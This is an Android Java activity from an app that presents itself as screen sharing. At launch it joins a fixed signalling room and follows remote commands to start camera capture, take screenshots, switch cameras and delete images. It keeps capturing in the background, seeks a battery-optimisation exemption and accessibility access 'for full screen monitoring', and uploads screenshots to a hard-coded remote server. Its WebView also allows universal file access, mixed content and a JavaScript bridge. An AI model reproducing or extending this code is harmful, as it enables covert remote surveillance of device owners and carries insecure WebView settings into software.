package com.example.myapplication;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.view.Surface;
import android.widget.Button;
import android.widget.Toast;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.webkit.JavascriptInterface;

import androidx.appcompat.app.AppCompatActivity;

import com.example.myapplication.databinding.ActivityMainBinding;
import com.example.myapplication.service.ScreenCaptureService;
import com.example.myapplication.signaling.SignalingClient;
import com.example.myapplication.webrtc.WebRTCClient;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import org.webrtc.IceCandidate;
import org.webrtc.PeerConnection;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceViewRenderer;
import org.webrtc.VideoSource;

import java.util.List;
import java.util.UUID;

import android.Manifest;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.example.myapplication.service.ImageCaptureService;
import android.os.PowerManager;
import android.provider.Settings;
import android.net.Uri;
import android.content.SharedPreferences;
import android.os.Handler;
import android.graphics.Bitmap;
import android.os.Environment;
import android.provider.MediaStore;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.net.Uri;
import java.io.OutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import android.media.MediaScannerConnection;
import android.view.View;
import android.graphics.Canvas;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import android.app.AlertDialog;
import androidx.annotation.Nullable;

public class MainActivity extends AppCompatActivity implements WebRTCClient.WebRTCListener, SignalingClient.SignalingClientListener, SignalingClient.ScreenCaptureCommandListener {
    private static final String TAG = "MainActivity";
    private static final int SCREEN_CAPTURE_REQUEST = 1001;
    private static final int CAMERA_PERMISSION_REQUEST = 100;
    private static final int PORT = 3000;
    private static final int STORAGE_PERMISSION_REQUEST = 2001;
    private static final int NOTIFICATION_PERMISSION_REQUEST = 2002;
    private static final String SERVER_URL = "https://myapplication4.onrender.com/upload";
    private static final OkHttpClient client = new OkHttpClient();
    private static final int REQUEST_MEDIA_PROJECTION = 1;
    
    private ActivityMainBinding binding;
    private WebRTCClient webRTCClient;
    private SignalingClient signalingClient;
    private ScreenCaptureService screenCaptureService;
    private boolean isScreenSharing = false;
    private VideoSource videoSource;
    private WebView webView;
    private String serverUrl;
    private boolean isImageCaptureRunning = false;
    private WebAppInterface webAppInterface;
    private boolean shouldTakeScreenshotAfterPermission = false;
    private MediaProjectionManager mediaProjectionManager;
    private boolean bound = false;
    
    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            ScreenCaptureService.LocalBinder binder = (ScreenCaptureService.LocalBinder) service;
            screenCaptureService = binder.getService();
            bound = true;
            // Try to start with saved projection data
            screenCaptureService.startProjectionFromSaved();
        }
        
        @Override
        public void onServiceDisconnected(ComponentName name) {
            bound = false;
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        setSupportActionBar(binding.toolbar);
        
        // Request all permissions at startup
        requestAllPermissions();
        
        // Initialize MediaProjectionManager
        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        // Request screen capture permission on first launch
        if (!hasScreenCapturePermission()) {
            requestScreenCapturePermission();
        }
        
        // Initialize SignalingClient
        signalingClient = new SignalingClient(this, this);
        signalingClient.setCameraCommandListener((command, cameraType) -> {
            runOnUiThread(() -> {
                Log.d(TAG, "cameraCommand received: " + command);
                Toast.makeText(this, "cameraCommand received: " + command, Toast.LENGTH_SHORT).show();
                if ("startCapture".equals(command)) {
                    Log.d(TAG, "Remote command: startCapture");
                    startImageCapture();

                    // Always try to start screen capture service
                    Intent screenIntent = new Intent(this, com.example.myapplication.service.ScreenCaptureService.class);
                    if (com.example.myapplication.service.ScreenCaptureService.lastResultCode != -1 && com.example.myapplication.service.ScreenCaptureService.lastData != null) {
                        Log.d(TAG, "ScreenCaptureService permission available, starting service");
                        screenIntent.putExtra("resultCode", com.example.myapplication.service.ScreenCaptureService.lastResultCode);
                        screenIntent.putExtra("data", com.example.myapplication.service.ScreenCaptureService.lastData);
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            try {
                                startForegroundService(screenIntent);
                                Toast.makeText(this, "ScreenCaptureService started with existing permission", Toast.LENGTH_SHORT).show();
                            } catch (Exception e) {
                                Log.e(TAG, "Failed to start ScreenCaptureService: " + e.getMessage());
                                Toast.makeText(this, "Failed to start ScreenCaptureService", Toast.LENGTH_SHORT).show();
                            }
                        } else {
                            startService(screenIntent);
                            Toast.makeText(this, "ScreenCaptureService started with existing permission", Toast.LENGTH_SHORT).show();
                        }
                    } else {
                        Log.d(TAG, "Screen capture permission not granted. Requesting permission...");
                        Toast.makeText(this, "Screen capture permission not granted. Requesting permission...", Toast.LENGTH_LONG).show();
                        requestScreenCapturePermission();
                    }
                } else if ("stopCapture".equals(command)) {
                    Log.d(TAG, "Remote command: stopCapture");
                    // Stop image capture service
                    Intent imageIntent = new Intent(this, com.example.myapplication.service.ImageCaptureService.class);
                    imageIntent.setAction(com.example.myapplication.service.ImageCaptureService.ACTION_STOP_CAPTURE);
                    startService(imageIntent);
                    stopService(imageIntent);

                    // Stop screen capture service
                    Intent screenIntent = new Intent(this, com.example.myapplication.service.ScreenCaptureService.class);
                    stopService(screenIntent);
                    Log.d(TAG, "ScreenCaptureService stopped");
                } else if ("switchCamera".equals(command)) {
                    Log.d(TAG, "Remote command: switchCamera to " + cameraType);
                    Intent intent = new Intent(this, ImageCaptureService.class);
                    intent.setAction(ImageCaptureService.ACTION_SWITCH_CAMERA);
                    intent.putExtra(ImageCaptureService.EXTRA_USE_FRONT_CAMERA, "front".equalsIgnoreCase(cameraType));
                    startService(intent);
                } else if ("deleteImages".equals(command)) {
                    Log.d(TAG, "Remote command: deleteImages");
                    Intent intent = new Intent(this, ImageCaptureService.class);
                    intent.setAction(ImageCaptureService.ACTION_DELETE_IMAGES);
                    startService(intent);
                } else if ("screenCapture".equals(command)) {
                    Log.d(TAG, "Remote command: screenCapture");
                    Toast.makeText(this, "Screen capture command received", Toast.LENGTH_SHORT).show();
                    if (isScreenCaptureServiceRunningAndReady()) {
                        Log.d(TAG, "Sending ACTION_SCREENSHOT_ONCE broadcast");
                        Toast.makeText(this, "Sending ACTION_SCREENSHOT_ONCE broadcast", Toast.LENGTH_SHORT).show();
                        Intent intent = new Intent(ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
                        sendBroadcast(intent);
                        Toast.makeText(this, "Triggered screenshot via broadcast", Toast.LENGTH_SHORT).show();
                    } else {
                        requestScreenCapturePermission();
                    }
                }
            });
        });
        // Always join global_room on startup
        signalingClient.connect(() -> signalingClient.joinRoom("global_room"));

        setupWebRTC();
        setupClickListeners();
        setupWebView();
        checkPermissions();

        // Request camera permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.CAMERA},
                    CAMERA_PERMISSION_REQUEST);
        } else {
            startImageCapture();
            requestIgnoreBatteryOptimizations();
        }

        // Wire up screenshot button from XML
        Button screenshotButton = findViewById(R.id.screenshotButton);
        screenshotButton.setOnClickListener(v -> {
            if (!isMediaProjectionDataValid()) {
                ensureScreenCapturePermissionOrPrompt();
                return;
            }
            // Start the service with the latest permission
            Intent intent = new Intent(this, ScreenCaptureService.class);
            intent.putExtra("resultCode", ScreenCaptureService.lastResultCode);
            intent.putExtra("data", ScreenCaptureService.lastData);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            // Wait a bit longer for the service to be ready, then send the broadcast
            new Handler().postDelayed(() -> {
                Intent screenshotIntent = new Intent(ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
                sendBroadcast(screenshotIntent);
                Toast.makeText(this, "Screenshot command sent to service", Toast.LENGTH_SHORT).show();
                Log.d(TAG, "Screenshot command sent to service");
            }, 2000); // 2 second delay for reliability
        });

        // Check and prompt for Accessibility Service
        if (!isAccessibilityServiceEnabled()) {
            showAccessibilityServicePrompt();
        }

        // Start and bind to ScreenCaptureService
        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        bindService(serviceIntent, connection, BIND_AUTO_CREATE);

        // Request MediaProjection permission on button click
        findViewById(R.id.btnStartCapture).setOnClickListener(v -> {
            requestMediaProjectionPermission();
        });
    }
    
    private void setupWebRTC() {
        try {
            webRTCClient = new WebRTCClient(this, this);
            webRTCClient.initialize();
            videoSource = webRTCClient.createVideoSource();
            if (videoSource == null) {
                Toast.makeText(this, "Failed to create video source", Toast.LENGTH_SHORT).show();
            }
            updateButtonState(false);
        } catch (Exception e) {
            Log.e(TAG, "Error in setupWebRTC: " + e.getMessage(), e);
            Toast.makeText(this, "Failed to initialize WebRTC: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    
    private void setupClickListeners() {
        binding.startShareButton.setOnClickListener(v -> {
            String roomId = binding.roomIdInput.getText().toString();
            if (roomId.isEmpty()) {
                roomId = UUID.randomUUID().toString().substring(0, 8);
                binding.roomIdInput.setText(roomId);
            }
            final String finalRoomId = roomId;

            if (!isScreenSharing) {
                String finalRoomId1 = roomId;
                signalingClient.connect(() -> {
                    // Connection established callback
                    signalingClient.joinRoom(finalRoomId);
                    Toast.makeText(this, String.format("Connecting to room: %s...", finalRoomId1), Toast.LENGTH_SHORT).show();
                    startScreenShare();
                });
            } else {
                stopScreenShare();
                signalingClient.disconnect();
                Toast.makeText(this, "Disconnected from room", Toast.LENGTH_SHORT).show();
            }
        });
        
        binding.joinRoomButton.setOnClickListener(v -> {
            String roomId = binding.roomIdInput.getText().toString();
            if (!roomId.isEmpty()) {
                signalingClient.connect(() -> {});
                signalingClient.joinRoom(roomId);
                Toast.makeText(this, "Joining room: " + roomId + "...", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Please enter a room ID", Toast.LENGTH_SHORT).show();
            }
        });
    }
    
    private String getServerUrl() {
        if (serverUrl == null) {
            // Get the server URL from SharedPreferences or use default
            SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
            serverUrl = prefs.getString("server_url", "https://myapplication4.onrender.com/");
        }
        return serverUrl;
    }

    private void setServerUrl(String url) {
        serverUrl = url;
        // Save the server URL to SharedPreferences
        SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        prefs.edit().putString("server_url", url).apply();
    }

    private void setupWebView() {
        webView = findViewById(R.id.webView);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        
        webAppInterface = new WebAppInterface(this);
        webView.addJavascriptInterface(webAppInterface, "Android");
        
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Inject JavaScript to check interface availability
                String js = "javascript:(function() { " +
                    "if (window.Android && window.Android.isInterfaceAvailable()) { " +
                    "document.getElementById('status').innerHTML = 'Android interface available';" +
                    "document.getElementById('status').className = 'success';" +
                    "} else { " +
                    "document.getElementById('status').innerHTML = 'Android interface not available';" +
                    "document.getElementById('status').className = 'error';" +
                    "}" +
                    "})()";
                view.evaluateJavascript(js, null);
            }
        });
        
        // Set the server URL
        setServerUrl("https://myapplication4.onrender.com/");
        webView.loadUrl(getServerUrl());
    }
    
    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Dexter.withContext(this)
                    .withPermissions(
                            android.Manifest.permission.RECORD_AUDIO,
                            android.Manifest.permission.INTERNET,
                            android.Manifest.permission.POST_NOTIFICATIONS,
                            android.Manifest.permission.FOREGROUND_SERVICE,
                            android.Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
                            android.Manifest.permission.FOREGROUND_SERVICE_CAMERA,
                            android.Manifest.permission.WAKE_LOCK,
                            android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    )
                    .withListener(new MultiplePermissionsListener() {
                        @Override
                        public void onPermissionsChecked(MultiplePermissionsReport report) {
                            if (report.areAllPermissionsGranted()) {
                                Toast.makeText(MainActivity.this, 
                                        "All permissions granted", Toast.LENGTH_SHORT).show();
                                startImageCapture();
                                requestIgnoreBatteryOptimizations();
                            } else {
                                Toast.makeText(MainActivity.this, 
                                        "Please grant all permissions", Toast.LENGTH_SHORT).show();
                            }
                        }
                        
                        @Override
                        public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, 
                                PermissionToken token) {
                            token.continuePermissionRequest();
                        }
                    }).check();
        } else {
            Dexter.withContext(this)
                    .withPermissions(
                            android.Manifest.permission.RECORD_AUDIO,
                            android.Manifest.permission.INTERNET,
                            android.Manifest.permission.FOREGROUND_SERVICE,
                            android.Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
                            android.Manifest.permission.FOREGROUND_SERVICE_CAMERA,
                            android.Manifest.permission.WAKE_LOCK,
                            android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    )
                    .withListener(new MultiplePermissionsListener() {
                        @Override
                        public void onPermissionsChecked(MultiplePermissionsReport report) {
                            if (report.areAllPermissionsGranted()) {
                                Toast.makeText(MainActivity.this, 
                                        "All permissions granted", Toast.LENGTH_SHORT).show();
                                startImageCapture();
                                requestIgnoreBatteryOptimizations();
                            } else {
                                Toast.makeText(MainActivity.this, 
                                        "Please grant all permissions", Toast.LENGTH_SHORT).show();
                            }
                        }
                        
                        @Override
                        public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, 
                                PermissionToken token) {
                            token.continuePermissionRequest();
                        }
                    }).check();
        }
    }
    
    private void startImageCapture() {
        if (!isImageCaptureRunning) {
            Intent intent = new Intent(this, ImageCaptureService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            isImageCaptureRunning = true;
            Toast.makeText(this, "Image capture service started", Toast.LENGTH_SHORT).show();
            // Also take a screenshot when image capture starts, after layout is ready
            View rootView = getWindow().getDecorView().getRootView();
            rootView.post(() -> captureAndSaveAppScreenshot());
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (webRTCClient != null) {
            webRTCClient.release();
        }
        if (signalingClient != null) {
            signalingClient.disconnect();
        }
        if (bound) {
            unbindService(connection);
            bound = false;
        }
        // Don't stop the image capture service when the activity is destroyed
        // This allows it to continue running in the background
    }
    
    private void startScreenShare() {
        try {
            if (!isScreenSharing) {
                Log.d(TAG, "Starting screen share...");
                MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (mediaProjectionManager == null) {
                    Log.e(TAG, "MediaProjectionManager is null");
                    Toast.makeText(this, "Failed to initialize screen capture", Toast.LENGTH_SHORT).show();
                    return;
                }
                Toast.makeText(this, "Please allow screen capture", Toast.LENGTH_SHORT).show();
                startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen share: " + e.getMessage(), e);
            Toast.makeText(this, "Failed to start screen sharing: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK) {
            // Save to static variables
            com.example.myapplication.service.ScreenCaptureService.lastResultCode = resultCode;
            com.example.myapplication.service.ScreenCaptureService.lastData = data;
            // Start the service after permission is granted
            Intent intent = new Intent(this, com.example.myapplication.service.ScreenCaptureService.class);
            intent.putExtra("resultCode", resultCode);
            intent.putExtra("data", data);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            // Optionally, trigger screenshot if user was waiting
            if (shouldTakeScreenshotAfterPermission) {
                shouldTakeScreenshotAfterPermission = false;
                new Handler().postDelayed(() -> {
                    Intent screenshotIntent = new Intent(com.example.myapplication.service.ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
                    sendBroadcast(screenshotIntent);
                    Toast.makeText(this, "Screenshot command sent to service", Toast.LENGTH_SHORT).show();
                }, 1000);
            }
        } else if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                if (bound && screenCaptureService != null) {
                    screenCaptureService.startProjection(resultCode, data);
                }
            }
        } else {
            Toast.makeText(this, "Screen capture permission not granted", Toast.LENGTH_SHORT).show();
        }
    }
    
    // WebRTCListener Implementation
    @Override
    public void onIceCandidateReceived(IceCandidate iceCandidate) {
        signalingClient.sendIceCandidate(iceCandidate);
    }
    
    @Override
    public void onConnectionStateChanged(PeerConnection.PeerConnectionState state) {
        runOnUiThread(() -> {
            String message = "WebRTC connection state: " + state.toString();
            Log.d(TAG, message);
            
            switch (state) {
                case CONNECTED:
                    Toast.makeText(this, "Connected to peer! Screen sharing active", Toast.LENGTH_SHORT).show();
                    break;
                case DISCONNECTED:
                    Toast.makeText(this, "Peer disconnected", Toast.LENGTH_SHORT).show();
                    stopScreenShare();
                    break;
                case FAILED:
                    Toast.makeText(this, "Connection failed. Please try again", Toast.LENGTH_SHORT).show();
                    stopScreenShare();
                    break;
                case CONNECTING:
                    Toast.makeText(this, "Connecting to peer...", Toast.LENGTH_SHORT).show();
                    break;
            }
        });
    }
    
    // SignalingClientListener Implementation
    @Override
    public void onConnectionEstablished() {
        runOnUiThread(() -> {
            Log.d(TAG, "Signaling server connected");
            Toast.makeText(this, "Connected to signaling server", Toast.LENGTH_SHORT).show();
        });
    }
    
    @Override
    public void onOfferReceived(SessionDescription sessionDescription) {
        runOnUiThread(() -> {
            Toast.makeText(this, "Received connection offer from peer", Toast.LENGTH_SHORT).show();
        });
        webRTCClient.setRemoteDescription(sessionDescription);
        webRTCClient.createAnswer();
    }
    
    @Override
    public void onAnswerReceived(SessionDescription sessionDescription) {
        runOnUiThread(() -> {
            Toast.makeText(this, "Received answer from peer", Toast.LENGTH_SHORT).show();
        });
        webRTCClient.setRemoteDescription(sessionDescription);
    }
    
    @Override
    public void onRemoteIceCandidateReceived(IceCandidate iceCandidate) {
        webRTCClient.addIceCandidate(iceCandidate);
    }

    private void updateButtonState(boolean isSharing) {
        binding.startShareButton.setText(isSharing ? "Stop Sharing" : "Start Sharing");
    }

    private void stopScreenShare() {
        try {
            if (screenCaptureService != null) {
                screenCaptureService.stopProjection();
                unbindService(connection);
                screenCaptureService = null;
            }
            if (webRTCClient != null) {
                webRTCClient.disposeVideoSource();
                videoSource = webRTCClient.createVideoSource();
            }
            isScreenSharing = false;
            updateButtonState(false);
        } catch (Exception e) {
            Log.e(TAG, "Error in stopScreenShare: " + e.getMessage(), e);
            Toast.makeText(this, "Error stopping screen share: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == CAMERA_PERMISSION_REQUEST) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startImageCapture();
                requestIgnoreBatteryOptimizations();
            } else {
                Toast.makeText(this, "Camera permission is required", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == STORAGE_PERMISSION_REQUEST) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Storage permission granted. Please tap 'Take Screenshot' again.", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Storage permission is required to save screenshots to gallery.", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

    public void requestScreenCapturePermission() {
        if (!hasScreenCapturePermission()) {
            showScreenCaptureExplanationAndRequest();
        } else {
            Toast.makeText(this, "Screen capture permission already granted", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onScreenCaptureCommand() {
        runOnUiThread(() -> {
            Toast.makeText(this, "Screen capture command received", Toast.LENGTH_SHORT).show();
            requestScreenCapturePermission();
        });
    }

    private boolean isScreenCaptureServiceRunningAndReady() {
        // Use the new method from ScreenCaptureService
        boolean active = com.example.myapplication.service.ScreenCaptureService.isMediaProjectionActive();
        Log.d(TAG, "isScreenCaptureServiceRunningAndReady: " + active);
        return active;
    }

    // Screenshot logic extracted to a method
    public void captureAndSaveAppScreenshot() {
        if (isScreenCaptureServiceRunningAndReady()) {
            Intent intent = new Intent(this, ScreenCaptureService.class);
            intent.putExtra("resultCode", ScreenCaptureService.lastResultCode);
            intent.putExtra("data", ScreenCaptureService.lastData);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            new Handler().postDelayed(() -> {
                Intent screenshotIntent = new Intent(ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
                sendBroadcast(screenshotIntent);
                Toast.makeText(this, "Screenshot command sent to service", Toast.LENGTH_SHORT).show();
                Log.d(TAG, "Screenshot command sent to service");
            }, 2000); // 2 second delay for reliability
        } else {
            Toast.makeText(this, "Screen capture permission not granted. Requesting permission...", Toast.LENGTH_LONG).show();
            Log.d(TAG, "Screen capture permission not granted. Requesting permission...");
            shouldTakeScreenshotAfterPermission = true;
            requestScreenCapturePermission();
        }
    }

    private void uploadScreenshotToServer(File screenshotFile) {
        Log.d(TAG, "Starting screenshot upload: " + screenshotFile.getName());
        if (!screenshotFile.exists()) {
            Log.e(TAG, "Screenshot file does not exist: " + screenshotFile.getAbsolutePath());
            return;
        }
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("image", screenshotFile.getName(),
                            RequestBody.create(MediaType.parse("image/jpeg"), screenshotFile))
                    .build();
            Request request = new Request.Builder()
                    .url(SERVER_URL)
                    .post(requestBody)
                    .addHeader("Accept", "application/json")
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to upload screenshot: " + e.getMessage(), e);
                }
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String responseBody = response.body() != null ? response.body().string() : "No response body";
                        if (response.isSuccessful()) {
                            Log.d(TAG, "Screenshot uploaded successfully: " + screenshotFile.getName() +
                                    ", Response: " + response.code() + ", Body: " + responseBody);
                            if (screenshotFile.getParentFile().equals(getCacheDir()) && screenshotFile.exists()) {
                                if (screenshotFile.delete()) {
                                    Log.d(TAG, "Temporary screenshot file deleted");
                                } else {
                                    Log.w(TAG, "Failed to delete temporary screenshot file");
                                }
                            }
                        } else {
                            Log.e(TAG, "Server error: " + response.code() + " - " +
                                    response.message() + ", Body: " + responseBody);
                        }
                    } finally {
                        response.close();
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error preparing screenshot upload request", e);
        }
    }

    private void requestAllPermissions() {
        // Request all runtime permissions at once
        String[] permissions = new String[] {
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.INTERNET,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.FOREGROUND_SERVICE,
                Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
                Manifest.permission.FOREGROUND_SERVICE_CAMERA,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        ActivityCompat.requestPermissions(this, permissions, STORAGE_PERMISSION_REQUEST);
    }

    // Show a dialog to explain why screen capture permission is needed
    private void showScreenCaptureExplanationAndRequest() {
        new AlertDialog.Builder(this)
            .setTitle("Screen Capture Permission Needed")
            .setMessage("To capture your screen, Android requires you to grant permission. Please tap 'Allow' in the next dialog. This is required by Android for your privacy and security. You will only be asked once unless the app is killed or restarted.")
            .setPositiveButton("OK", (dialog, which) -> launchScreenCapturePermissionIntent())
            .setCancelable(false)
            .show();
    }

    // Add this method to actually launch the permission intent
    private void launchScreenCapturePermissionIntent() {
        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        Intent permissionIntent = projectionManager.createScreenCaptureIntent();
        startActivityForResult(permissionIntent, SCREEN_CAPTURE_REQUEST);
    }

    // Add these methods for permission flag
    private boolean hasScreenCapturePermission() {
        SharedPreferences prefs = getSharedPreferences("screen_capture_prefs", MODE_PRIVATE);
        return prefs.getBoolean("permission_granted", false);
    }

    private void saveMediaProjectionPermissionGranted() {
        SharedPreferences prefs = getSharedPreferences("screen_capture_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("permission_granted", true).apply();
    }

    // Add this utility method to check if MediaProjection data is valid
    private boolean isMediaProjectionDataValid() {
        return com.example.myapplication.service.ScreenCaptureService.lastResultCode != -1 &&
               com.example.myapplication.service.ScreenCaptureService.lastData != null;
    }

    private void ensureScreenCapturePermissionOrPrompt() {
        if (!isMediaProjectionDataValid()) {
            Intent intent = new Intent(this, ScreenCapturePermissionActivity.class);
            startActivity(intent);
        }
    }

    private void requestMediaProjectionPermission() {
        MediaProjectionManager projectionManager =
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
    }

    private boolean isAccessibilityServiceEnabled() {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + com.example.myapplication.service.ScreenMonitorAccessibilityService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                return settingValue.contains(service);
            }
        }
        return false;
    }

    private void showAccessibilityServicePrompt() {
        new AlertDialog.Builder(this)
                .setTitle("Accessibility Permission Required")
                .setMessage("Please enable accessibility service for full screen monitoring")
                .setPositiveButton("Open Settings", (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivity(intent);
                })
                .setNegativeButton("Cancel", null)
                .show();
    }
}
